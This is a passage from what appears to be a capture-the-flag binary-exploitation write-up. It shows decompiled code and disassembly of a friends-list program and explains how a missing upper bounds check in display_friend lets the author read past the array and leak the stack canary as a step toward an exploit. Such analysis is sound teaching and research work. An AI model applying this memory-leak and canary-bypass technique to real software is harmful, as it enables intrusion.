+</span></span><span class=line><span class=cl>    <span class=n>iVar2</span> <span class=o>=</span> <span class=nf>FUN_00401160</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>iVar2</span> <span class=o>==</span> <span class=mi>4</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>lVar1</span> <span class=o>==</span> <span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_FS_OFFSET</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=nf>__stack_chk_fail</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>iVar2</span> <span class=o>&lt;</span> <span class=mi>5</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>iVar2</span> <span class=o>==</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nf>display_friend</span><span class=p>(</span><span class=n>top_friends</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=k>goto</span> <span class=n>LAB_00401636</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>iVar2</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>iVar2</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=nf>all_friends</span><span class=p>(</span><span class=n>top_friends</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>iVar2</span> <span class=o>!=</span> <span class=mi>2</span><span class=p>)</span> <span class=k>goto</span> <span class=n>LAB_004016cd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                <span class=nf>edit_friend</span><span class=p>(</span><span class=n>top_friends</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>            <span class=k>goto</span> <span class=n>LAB_00401636</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nl>LAB_004016cd</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Invalid option.&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>LAB_00401636</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>interesting things to note:</p><ul><li>the character count check is absolutely useless for options 2 and 3. The logic gate <code>((iVar2 &lt; 0) || (7 &lt; iVar2))</code> does technically work as control flow so this is very confusing</li></ul><p>I look at the disassembly of the <code>edit_friend</code> function, i see:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>Dump</span> <span class=no>of</span> <span class=no>assembler</span> <span class=no>code</span> <span class=no>for</span> <span class=no>function</span> <span class=no>display_friend</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004014d7</span> <span class=err>&lt;+</span><span class=mi>0</span><span class=err>&gt;</span><span class=p>:</span>     <span class=no>endbr64</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004014db</span> <span class=err>&lt;+</span><span class=mi>4</span><span class=err>&gt;</span><span class=p>:</span>     <span class=no>push</span>   <span class=no>rbp</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004014dc</span> <span class=err>&lt;+</span><span class=mi>5</span><span class=err>&gt;</span><span class=p>:</span>     <span class=no>mov</span>    <span class=no>rbp</span><span class=p>,</span><span class=no>rsp</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004014df</span> <span class=err>&lt;+</span><span class=mi>8</span><span class=err>&gt;</span><span class=p>:</span>     <span class=no>sub</span>    <span class=no>rsp</span><span class=p>,</span><span class=mi>0x40</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004014e3</span> <span class=err>&lt;+</span><span class=mi>12</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>mov</span>    <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x38</span><span class=p>],</span><span class=no>rdi</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004014e7</span> <span class=err>&lt;+</span><span class=mi>16</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>mov</span>    <span class=no>rax</span><span class=p>,</span><span class=no>QWORD</span> <span class=no>PTR</span> <span class=no>fs</span><span class=p>:</span><span class=mi>0x28</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004014f0</span> <span class=err>&lt;+</span><span class=mi>25</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>mov</span>    <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x8</span><span class=p>],</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004014f4</span> <span class=err>&lt;+</span><span class=mi>29</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>xor</span>    <span class=no>eax</span><span class=p>,</span><span class=no>eax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004014f6</span> <span class=err>&lt;+</span><span class=mi>31</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>lea</span>    <span class=no>rax</span><span class=p>,[</span><span class=no>rip</span><span class=err>+</span><span class=mi>0xbcb</span><span class=p>]</span>        <span class=c1># 0x4020c8
+</span></span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004014fd</span> <span class=err>&lt;+</span><span class=mi>38</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>mov</span>    <span class=no>rdi</span><span class=p>,</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401500</span> <span class=err>&lt;+</span><span class=mi>41</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>call</span>   <span class=mh>0x4010d0</span> <span class=p>&lt;</span><span class=no>puts@plt</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401505</span> <span class=err>&lt;+</span><span class=mi>46</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>mov</span>    <span class=no>rdx</span><span class=p>,</span><span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rip</span><span class=err>+</span><span class=mi>0x2b64</span><span class=p>]</span>        <span class=c1># 0x404070 &lt;stdin@GLIBC_2.2.5&gt;
+</span></span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040150c</span> <span class=err>&lt;+</span><span class=mi>53</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>lea</span>    <span class=no>rax</span><span class=p>,[</span><span class=no>rbp-0x20</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401510</span> <span class=err>&lt;+</span><span class=mi>57</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>mov</span>    <span class=no>esi</span><span class=p>,</span><span class=mi>0x10</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401515</span> <span class=err>&lt;+</span><span class=mi>62</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>mov</span>    <span class=no>rdi</span><span class=p>,</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401518</span> <span class=err>&lt;+</span><span class=mi>65</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>call</span>   <span class=mh>0x401130</span> <span class=p>&lt;</span><span class=no>fgets@plt</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040151d</span> <span class=err>&lt;+</span><span class=mi>70</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>lea</span>    <span class=no>rax</span><span class=p>,[</span><span class=no>rbp-0x20</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401521</span> <span class=err>&lt;+</span><span class=mi>74</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>mov</span>    <span class=no>rdi</span><span class=p>,</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401524</span> <span class=err>&lt;+</span><span class=mi>77</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>call</span>   <span class=mh>0x401160</span> <span class=p>&lt;</span><span class=no>atoi@plt</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401529</span> <span class=err>&lt;+</span><span class=mi>82</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>mov</span>    <span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x24</span><span class=p>],</span><span class=no>eax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040152c</span> <span class=err>&lt;+</span><span class=mi>85</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>cmp</span>    <span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x24</span><span class=p>],</span><span class=mi>0x0</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401530</span> <span class=err>&lt;+</span><span class=mi>89</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>js</span>     <span class=mh>0x401538</span> <span class=p>&lt;</span><span class=no>display_friend</span><span class=p>+</span><span class=mi>97</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401532</span> <span class=err>&lt;+</span><span class=mi>91</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>cmp</span>    <span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x24</span><span class=p>],</span><span class=mi>0x7</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401536</span> <span class=err>&lt;+</span><span class=mi>95</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>jle</span>    <span class=mh>0x401547</span> <span class=p>&lt;</span><span class=no>display_friend</span><span class=p>+</span><span class=mi>112</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401538</span> <span class=err>&lt;+</span><span class=mi>97</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>lea</span>    <span class=no>rax</span><span class=p>,[</span><span class=no>rip</span><span class=err>+</span><span class=mi>0xb55</span><span class=p>]</span>        <span class=c1># 0x402094
+</span></span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040153f</span> <span class=err>&lt;+</span><span class=mi>104</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>rdi</span><span class=p>,</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401542</span> <span class=err>&lt;+</span><span class=mi>107</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>call</span>   <span class=mh>0x4010d0</span> <span class=p>&lt;</span><span class=no>puts@plt</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401547</span> <span class=err>&lt;+</span><span class=mi>112</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>eax</span><span class=p>,</span><span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x24</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040154a</span> <span class=err>&lt;+</span><span class=mi>115</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>cdqe</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040154c</span> <span class=err>&lt;+</span><span class=mi>117</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>lea</span>    <span class=no>rdx</span><span class=p>,[</span><span class=no>rax</span><span class=p>*</span><span class=mi>8</span><span class=err>+</span><span class=mi>0x0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401554</span> <span class=err>&lt;+</span><span class=mi>125</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>rax</span><span class=p>,</span><span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x38</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401558</span> <span class=err>&lt;+</span><span class=mi>129</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>add</span>    <span class=no>rax</span><span class=p>,</span><span class=no>rdx</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040155b</span> <span class=err>&lt;+</span><span class=mi>132</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>edx</span><span class=p>,</span><span class=mi>0x8</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401560</span> <span class=err>&lt;+</span><span class=mi>137</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>rsi</span><span class=p>,</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401563</span> <span class=err>&lt;+</span><span class=mi>140</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>edi</span><span class=p>,</span><span class=mi>0x1</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401568</span> <span class=err>&lt;+</span><span class=mi>145</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>call</span>   <span class=mh>0x4010e0</span> <span class=p>&lt;</span><span class=no>write@plt</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040156d</span> <span class=err>&lt;+</span><span class=mi>150</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>nop</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040156e</span> <span class=err>&lt;+</span><span class=mi>151</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>rax</span><span class=p>,</span><span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x8</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401572</span> <span class=err>&lt;+</span><span class=mi>155</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>sub</span>    <span class=no>rax</span><span class=p>,</span><span class=no>QWORD</span> <span class=no>PTR</span> <span class=no>fs</span><span class=p>:</span><span class=mi>0x28</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040157b</span> <span class=err>&lt;+</span><span class=mi>164</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>je</span>     <span class=mh>0x401582</span> <span class=p>&lt;</span><span class=no>display_friend</span><span class=p>+</span><span class=mi>171</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040157d</span> <span class=err>&lt;+</span><span class=mi>166</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>call</span>   <span class=mh>0x4010f0</span> <span class=p>&lt;</span><span class=no>__stack_chk_fail@plt</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401582</span> <span class=err>&lt;+</span><span class=mi>171</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>leave</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401583</span> <span class=err>&lt;+</span><span class=mi>172</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>ret</span>
+</span></span><span class=line><span class=cl><span class=nf>End</span> <span class=no>of</span> <span class=no>assembler</span> <span class=no>dump.</span>
+</span></span></code></pre></td></tr></table></div></div><p>in the assembly of the control flow here</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=err>0</span><span class=nf>x0000000000401532</span> <span class=err>&lt;+</span><span class=mi>91</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>cmp</span>    <span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x24</span><span class=p>],</span><span class=mi>0x7</span>
+</span></span><span class=line><span class=cl><span class=err>0</span><span class=nf>x0000000000401536</span> <span class=err>&lt;+</span><span class=mi>95</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>jle</span>    <span class=mh>0x401547</span> <span class=p>&lt;</span><span class=no>display_friend</span><span class=p>+</span><span class=mi>112</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=err>0</span><span class=nf>x0000000000401538</span> <span class=err>&lt;+</span><span class=mi>97</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>lea</span>    <span class=no>rax</span><span class=p>,[</span><span class=no>rip</span><span class=err>+</span><span class=mi>0xb55</span><span class=p>]</span>        <span class=c1># 0x402094
+</span></span></span><span class=line><span class=cl><span class=err>0</span><span class=nf>x000000000040153f</span> <span class=err>&lt;+</span><span class=mi>104</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>rdi</span><span class=p>,</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl><span class=err>0</span><span class=nf>x0000000000401542</span> <span class=err>&lt;+</span><span class=mi>107</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>call</span>   <span class=mh>0x4010d0</span> <span class=p>&lt;</span><span class=no>puts@plt</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=err>0</span><span class=nf>x0000000000401547</span> <span class=err>&lt;+</span><span class=mi>112</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>eax</span><span class=p>,</span><span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x24</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=err>0</span><span class=nf>x000000000040154a</span> <span class=err>&lt;+</span><span class=mi>115</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>cdqe</span>
+</span></span><span class=line><span class=cl><span class=err>0</span><span class=nf>x000000000040154c</span> <span class=err>&lt;+</span><span class=mi>117</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>lea</span>    <span class=no>rdx</span><span class=p>,[</span><span class=no>rax</span><span class=p>*</span><span class=mi>8</span><span class=err>+</span><span class=mi>0x0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=err>0</span><span class=nf>x0000000000401554</span> <span class=err>&lt;+</span><span class=mi>125</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>rax</span><span class=p>,</span><span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x38</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=err>0</span><span class=nf>x0000000000401558</span> <span class=err>&lt;+</span><span class=mi>129</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>add</span>    <span class=no>rax</span><span class=p>,</span><span class=no>rdx</span>
+</span></span><span class=line><span class=cl><span class=err>0</span><span class=nf>x000000000040155b</span> <span class=err>&lt;+</span><span class=mi>132</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>edx</span><span class=p>,</span><span class=mi>0x8</span>
+</span></span><span class=line><span class=cl><span class=err>0</span><span class=nf>x0000000000401560</span> <span class=err>&lt;+</span><span class=mi>137</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>rsi</span><span class=p>,</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl><span class=err>0</span><span class=nf>x0000000000401563</span> <span class=err>&lt;+</span><span class=mi>140</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>edi</span><span class=p>,</span><span class=mi>0x1</span>
+</span></span><span class=line><span class=cl><span class=err>0</span><span class=nf>x0000000000401568</span> <span class=err>&lt;+</span><span class=mi>145</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>call</span>   <span class=mh>0x4010e0</span> <span class=p>&lt;</span><span class=no>write@plt</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>there is a jump for the index in range <code>jle 0x401547</code> for jumping if the index is less than or equal to 7 but there is actually no jump or ret made if the index is greater&mldr; meaning it still performs the stuff inside the else but with an index greater than 7. so i can write to a higher index. What this means though is that positionallly, 8x8 matrix is 64 bytes so after that, any index i choose will increase that offset by 8 bytes. Because <code>write()</code> has an fd to stdout, it prints the element at that position thus making a &ldquo;display&rdquo; feature. If i know the canary&rsquo;s alignment in the stack now i can continue with the exploit. I honestly just spammed random numbers in hopes of finding a suffix which ended with <code>00</code> since thats usually the standard convention for canaries but i guess like if you look at the disassembly for main:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>Dump</span> <span class=no>of</span> <span class=no>assembler</span> <span class=no>code</span> <span class=no>for</span> <span class=no>function</span> <span class=no>main</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401584</span> <span class=err>&lt;+</span><span class=mi>0</span><span class=err>&gt;</span><span class=p>:</span>     <span class=no>endbr64</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401588</span> <span class=err>&lt;+</span><span class=mi>4</span><span class=err>&gt;</span><span class=p>:</span>     <span class=no>push</span>   <span class=no>rbp</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401589</span> <span class=err>&lt;+</span><span class=mi>5</span><span class=err>&gt;</span><span class=p>:</span>     <span class=no>mov</span>    <span class=no>rbp</span><span class=p>,</span><span class=no>rsp</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040158c</span> <span class=err>&lt;+</span><span class=mi>8</span><span class=err>&gt;</span><span class=p>:</span>     <span class=no>add</span>    <span class=no>rsp</span><span class=p>,</span><span class=mi>0xffffffffffffff80</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401590</span> <span class=err>&lt;+</span><span class=mi>12</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>mov</span>    <span class=no>rax</span><span class=p>,</span><span class=no>QWORD</span> <span class=no>PTR</span> <span class=no>fs</span><span class=p>:</span><span class=mi>0x28</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401599</span> <span class=err>&lt;+</span><span class=mi>21</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>mov</span>    <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x8</span><span class=p>],</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040159d</span> <span class=err>&lt;+</span><span class=mi>25</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>xor</span>    <span class=no>eax</span><span class=p>,</span><span class=no>eax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040159f</span> <span class=err>&lt;+</span><span class=mi>27</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>mov</span>    <span class=no>rax</span><span class=p>,</span><span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rip</span><span class=err>+</span><span class=mi>0x2aba</span><span class=p>]</span>        <span class=c1># 0x404060 &lt;stdout@GLIBC_2.2.5&gt;
+</span></span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004015a6</span> <span class=err>&lt;+</span><span class=mi>34</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>mov</span>    <span class=no>ecx</span><span class=p>,</span><span class=mi>0x0</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004015ab</span> <span class=err>&lt;+</span><span class=mi>39</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>mov</span>    <span class=no>edx</span><span class=p>,</span><span class=mi>0x2</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004015b0</span> <span class=err>&lt;+</span><span class=mi>44</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>mov</span>    <span class=no>esi</span><span class=p>,</span><span class=mi>0x0</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004015b5</span> <span class=err>&lt;+</span><span class=mi>49</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>mov</span>    <span class=no>rdi</span><span class=p>,</span><span class=no>rax</span>
